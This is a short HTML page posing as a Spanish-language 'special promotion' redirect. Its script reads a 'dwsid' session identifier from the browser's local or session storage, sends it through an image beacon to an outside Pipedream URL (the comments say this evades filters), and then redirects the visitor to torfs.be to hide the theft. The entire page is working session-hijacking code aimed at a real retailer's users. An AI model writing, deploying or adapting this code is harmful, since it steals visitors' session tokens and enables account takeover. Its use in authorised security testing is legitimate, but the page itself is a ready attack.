<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Promoción especial</title>
</head>
<body>
  <h1>Redirigiendo a la oferta...</h1>
  <script>
    // Captura el dwsid desde localStorage o sessionStorage
    const dwsid = localStorage.getItem('dwsid') || sessionStorage.getItem('dwsid') || 'none';

    // Envía el dwsid a Pipedream usando una solicitud GET para evadir filtros
    const url = "https://eoozwutroaqr7ij.m.pipedream.net?dwsid=" + encodeURIComponent(dwsid);
    const img = new Image();
    img.src = url;

    // Redirige a torfs.be después de un breve retraso
    setTimeout(() => {
      window.location.href = "https://www.torfs.be";
    }, 1000);
  </script>
</body>
</html>
